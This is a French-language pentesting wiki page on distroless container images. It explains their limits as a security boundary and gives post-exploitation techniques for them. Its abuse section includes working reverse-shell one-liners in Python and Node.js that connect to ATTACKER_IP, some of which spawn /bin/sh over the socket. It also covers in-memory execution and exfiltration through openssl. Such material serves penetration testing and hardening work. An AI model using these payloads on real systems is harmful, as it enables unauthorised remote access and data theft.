# Conteneurs distroless

{{#include ../../../banners/hacktricks-training.md}}

## Vue d’ensemble

Une image de conteneur **distroless** fournit les **composants d’exécution minimaux nécessaires pour lancer une application spécifique**, tout en supprimant volontairement les outils habituels des distributions, comme les gestionnaires de paquets, les shells et les grands ensembles d’utilitaires génériques en espace utilisateur. En pratique, les images distroless ne contiennent souvent que le binaire ou l’environnement d’exécution de l’application, ses bibliothèques partagées, les bundles de certificats et une arborescence de fichiers très réduite. <sup>[[1]](#references)</sup>

L’idée n’est pas que distroless constitue une nouvelle primitive d’isolation du noyau. Distroless est une **stratégie de conception d’image**. Elle modifie ce qui est disponible **à l’intérieur** du système de fichiers du conteneur, et non la façon dont le noyau isole le conteneur. Cette distinction est importante, car distroless renforce principalement l’environnement en réduisant les moyens dont un attaquant peut se servir après avoir obtenu l’exécution de code. Cette approche ne remplace ni les namespaces, ni seccomp, ni les capabilities, ni AppArmor, SELinux ou tout autre mécanisme d’isolation à l’exécution.

## Pourquoi distroless existe

Les images distroless sont principalement utilisées pour réduire :

- la taille de l’image
- la complexité opérationnelle de l’image
- le nombre de paquets et de binaires susceptibles de contenir des vulnérabilités
- le nombre d’outils de post-exploitation disponibles par défaut pour un attaquant

C’est pourquoi les images distroless sont populaires pour les déploiements d’applications en production. Un conteneur sans shell, sans gestionnaire de paquets et presque dépourvu d’outils génériques est généralement plus facile à gérer sur le plan opérationnel et plus difficile à exploiter de manière interactive après une compromission.

Voici quelques familles d’images distroless bien connues :

- les images distroless de Google <sup>[[1]](#references)</sup>
- les images renforcées/minimales de Chainguard <sup>[[2]](#references)</sup>

## Ce que distroless ne signifie pas

Un conteneur distroless n’est **pas** :

- automatiquement rootless
- automatiquement non privilégié
- automatiquement en lecture seule
- automatiquement protégé par seccomp, AppArmor ou SELinux
- automatiquement à l’abri d’une évasion de conteneur

Il est toujours possible de lancer une image distroless avec `--privileged`, en partageant les namespaces de l’hôte, avec des bind mounts dangereux ou avec un socket d’exécution monté. Dans ce cas, l’image peut être minimale, mais le conteneur reste gravement vulnérable. Distroless modifie la **surface d’attaque de l’espace utilisateur**, et non la **frontière de confiance du noyau**.

## Caractéristiques opérationnelles typiques

Lorsque vous compromettez un conteneur distroless, vous remarquez généralement d’abord que les hypothèses habituelles ne sont plus valables. Il peut ne pas y avoir de `sh`, de `bash`, de `ls`, de `id`, de `cat`, ni même d’environnement basé sur libc qui se comporte comme le prévoient vos techniques habituelles. Cela affecte aussi bien l’attaque que la défense, car l’absence d’outils change le débogage, la réponse aux incidents et la post-exploitation.

Les situations les plus courantes sont les suivantes :

- l’environnement d’exécution de l’application est présent, mais il y a peu d’autres éléments
- les payloads basés sur un shell échouent parce qu’il n’y a pas de shell
- les commandes d’énumération courantes échouent parce que les binaires auxiliaires sont absents
- des protections du système de fichiers, comme un rootfs en lecture seule ou `noexec` sur des emplacements tmpfs accessibles en écriture, sont souvent également présentes

C’est généralement cette combinaison qui amène à parler de « weaponizing distroless ».

## Distroless et post-exploitation

Dans un environnement distroless, le principal défi offensif n’est pas toujours le RCE initial. Il concerne souvent ce qui vient ensuite. Si la charge de travail compromise permet d’exécuter du code dans un environnement d’exécution tel que Python, Node.js, Java ou Go, vous pouvez peut-être exécuter une logique arbitraire, mais pas en suivant les workflows habituels centrés sur le shell, courants sur d’autres cibles Linux.

La post-exploitation prend alors souvent l’une de ces trois directions :

1. **Utiliser directement l’environnement d’exécution déjà présent** pour énumérer l’environnement, ouvrir des sockets, lire des fichiers ou déposer d’autres payloads.
2. **Charger vos propres outils en mémoire** si le système de fichiers est en lecture seule ou si les emplacements accessibles en écriture sont montés avec `noexec`.
3. **Abuser des binaires déjà présents dans l’image** si l’application ou ses dépendances incluent un élément étonnamment utile.

## Abus

### Énumérer l’environnement d’exécution déjà disponible

Dans de nombreux conteneurs distroless, il n’y a pas de shell, mais un environnement d’exécution d’application est tout de même présent. Si la cible est un service Python, Python est disponible. Si la cible est Node.js, Node est disponible. Cela suffit souvent pour énumérer les fichiers, lire les variables d’environnement, ouvrir des reverse shells et exécuter des payloads en mémoire sans jamais invoquer `/bin/sh`.

Un exemple simple avec Python :

```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```

Un exemple simple avec Node.js :

```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```

Impact :

- récupération des variables d’environnement, qui comprennent souvent des identifiants ou des endpoints de service
- énumération du système de fichiers sans `/bin/ls`
- identification des chemins accessibles en écriture et des secrets montés

### Session interactive sans `/bin/sh`

Si l’image ne contient pas `sh` ou `bash`, un reverse shell classique basé sur un shell échoue. Dans ce cas, exposez une session interactive dans le runtime du langage installé au lieu de lancer un shell inexistant.

Par exemple, ce payload Python redirige une console Python interactive via un socket :

```bash
python3 - <<'PY'
import code, socket, sys
s = socket.create_connection(("ATTACKER_IP", 4444))
stream = s.makefile("rw", buffering=1)
sys.stdin = sys.stdout = sys.stderr = stream
code.interact(local=globals())
PY
```

L’approche équivalente en Node.js peut évaluer du JavaScript reçu via un socket. Il s’agit d’un REPL JavaScript, et non d’un shell du système d’exploitation ; les opérations sur le système de fichiers, les processus et le réseau doivent être effectuées via les API de Node :

```bash
node -e 'const net=require("net");const s=net.connect(4444,"ATTACKER_IP");s.on("data",d=>{try{s.write(String(eval(d.toString()))+"\n")}catch(e){s.write(String(e)+"\n")}});'
```

Les deux exemples nécessitent une connectivité sortante et un interpréteur disponible, et ne fournissent que les fonctionnalités offertes par cet interpréteur.

Si l’image inclut de façon inattendue `/bin/sh`, les payloads classiques de shell assistés par un interpréteur restent utiles. Ils sont présentés séparément, car ils ne sont pas réellement dépourvus de shell :

```bash
# Python plus an existing /bin/sh
python3 - <<'PY'
import os, pty, socket
s = socket.create_connection(("ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/sh")
PY

# Node.js plus an existing /bin/sh
node -e 'const net=require("net"),cp=require("child_process");const s=net.connect(4444,"ATTACKER_IP",()=>{const p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```

L’ancien modèle de boucle de commandes Python est également utile lorsque `/bin/sh` existe, mais qu’un PTY interactif n’est pas pratique. Il est conservé ici en explicitant sa véritable dépendance : `subprocess.run(..., shell=True)` invoque le shell système et n’est donc **pas une technique sans shell**.

```bash
python3 -c '
import subprocess
while True:
    cmd = input("sh> ")
    if cmd.strip() in ("exit", "quit"):
        break
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout, end="")
    print(result.stderr, end="")
'
```

### Exemple complet : boucle de commandes Python sans shell

Si l’image contient Python mais aucun shell, un REPL Python local peut tout de même permettre d’inspecter le système de fichiers, l’environnement et le réseau :

```bash
python3 - <<'PY'
namespace = {}
while True:
    source = input("py> ")
    if source.strip() in ("exit", "quit"):
        break
    try:
        result = eval(source, namespace)
        if result is not None:
            print(repr(result))
    except SyntaxError:
        exec(source, namespace)
PY
```

Cette boucle n’invoque pas `/bin/sh`. Elle évalue directement des expressions et instructions Python ; les opérations doivent donc utiliser les API Python plutôt que des commandes shell. Malgré cette limitation, elle peut tout de même offrir une grande partie des capacités d’un shell de base : énumération du système de fichiers et de l’environnement, accès aux données, activité réseau et mise en place d’autres payloads à l’aide du runtime installé.

### Exécution d’outils en mémoire

Les images Distroless sont souvent combinées avec :

- `readOnlyRootFilesystem: true`
- un tmpfs inscriptible mais `noexec`, tel que `/dev/shm`
- l’absence d’outils de gestion des paquets

Cette combinaison rend peu fiables les méthodes classiques consistant à « télécharger un binaire sur le disque et l’exécuter ». Dans ces cas, les techniques d’exécution en mémoire deviennent la principale solution.

La page dédiée à ce sujet est :

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Les techniques les plus pertinentes sont :

- `memfd_create` + `execve` via des runtimes de script <sup>[[4]](#references)</sup>
- DDexec / EverythingExec
- memexec
- memdlopen

Pour un service Python, Node.js ou PHP, le point d’entrée peut être une vulnérabilité de l’application, comme une injection de template, une pollution de prototype ou une évaluation non sécurisée. Si elle permet l’exécution de code dans le processus, une technique utilisant `/proc/self/mem` peut exécuter un loader sans shell ni fichier exécutable sur le disque. L’exécution conserve l’identité du processus du conteneur ; une vulnérabilité distincte dans le runtime ou à la frontière de l’hôte est nécessaire pour sortir du conteneur. Voir les [techniques read-only/noexec/distroless](../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/README.md) pour connaître les prérequis.

### Binaires déjà présents dans l’image

Certaines images Distroless contiennent encore des binaires nécessaires à leur fonctionnement qui deviennent utiles après une compromission. Un exemple souvent observé est `openssl`, car les applications en ont parfois besoin pour des tâches liées à la cryptographie ou à TLS.

Voici une méthode de recherche rapide :

```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```

Si `openssl` est présent, il peut servir à :

- établir des connexions TLS sortantes
- exfiltrer des données via un canal de sortie autorisé
- préparer des données de payload dans des blocs encodés/chiffrés

Les abus possibles dépendent de ce qui est réellement installé, mais l’idée générale est que distroless ne signifie pas « aucun outil » ; cela signifie « bien moins d’outils qu’une image de distribution classique ».

## Checks

L’objectif de ces checks est de déterminer si l’image est réellement distroless en pratique et quels binaires d’exécution ou auxiliaires sont encore disponibles pour la post-exploitation.

```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```

Ce qui est intéressant ici :

- Si aucun shell n’est disponible, mais qu’un runtime tel que Python ou Node est présent, la post-exploitation devrait privilégier l’exécution via le runtime.
- Si le système de fichiers racine est en lecture seule et que `/dev/shm` est accessible en écriture, mais avec l’option `noexec`, les techniques d’exécution en mémoire deviennent bien plus pertinentes.
- Si des binaires utilitaires tels que `openssl`, `busybox` ou `java` sont présents, ils peuvent fournir suffisamment de fonctionnalités pour amorcer un accès plus étendu.

## Valeurs par défaut du runtime

| Style d’image / plateforme | État par défaut | Comportement typique | Affaiblissements manuels courants |
| --- | --- | --- | --- |
| Images de style Google distroless | Espace utilisateur minimal par conception | Aucun shell, aucun gestionnaire de paquets, uniquement les dépendances de l’application et du runtime | ajout de couches de débogage, de shells sidecar, copie de busybox ou d’outils |
| Images minimales Chainguard | Espace utilisateur minimal par conception | Surface réduite de paquets, souvent centrée sur un seul runtime ou service | utilisation de variantes `:latest-dev` ou de débogage, copie d’outils lors du build |
| Charges de travail Kubernetes utilisant des images distroless | Dépend de la configuration du Pod | Distroless n’affecte que l’espace utilisateur ; la posture de sécurité du Pod dépend toujours de sa spécification et des paramètres par défaut du runtime | ajout de conteneurs de débogage éphémères, de montages de l’hôte, de paramètres de Pod privilégiés |
| Docker / Podman exécutant des images distroless | Dépend des options d’exécution | Système de fichiers minimal, mais la sécurité du runtime dépend toujours des options et de la configuration du daemon | `--privileged`, partage des espaces de noms de l’hôte, montages du socket du runtime, montages de l’hôte accessibles en écriture |

Le point essentiel est que distroless est une **propriété de l’image**, et non une protection du runtime. Son intérêt vient de la réduction des éléments disponibles dans le système de fichiers après une compromission. Les builds multi-stage sont une méthode courante pour exclure les outils de build de l’image finale. <sup>[[3]](#references)</sup>

## Pages connexes

Pour les contournements des protections du système de fichiers et de l’exécution en mémoire couramment nécessaires dans les environnements distroless :

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Pour les abus du runtime de conteneur, des sockets et des montages qui s’appliquent aussi aux charges de travail distroless :

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## References

- [1] [GoogleContainerTools - Images de conteneurs distroless](https://github.com/GoogleContainerTools/distroless)
- [2] [Documentation sur les images Chainguard](https://edu.chainguard.dev/chainguard/chainguard-images/)
- [3] [Docker Docs - Builds multi-stage](https://docs.docker.com/build/building/multi-stage/)
- [4] [`memfd_create(2)` - Page du manuel Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
{{#include ../../../banners/hacktricks-training.md}}
